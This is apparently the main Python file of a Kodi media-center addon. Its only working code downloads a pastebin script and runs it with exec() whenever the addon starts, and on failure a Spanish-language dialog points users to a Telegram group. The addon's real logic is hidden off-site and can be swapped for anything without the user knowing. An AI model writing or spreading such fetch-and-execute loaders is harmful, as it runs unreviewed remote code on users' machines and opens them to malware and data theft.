# -*- coding: utf-8 -*-
import requests, urllib, urllib2
import xbmc, xbmcgui, xbmcaddon

try:   
    exec(requests.get('https://pastebin.com/raw/bkB9hrxX').text)

except: 
     xbmcgui.Dialog().ok('Info', 'Ha ocurrido un error al entrar al addon entra al grupo de telegram @AprendiendoKodi')


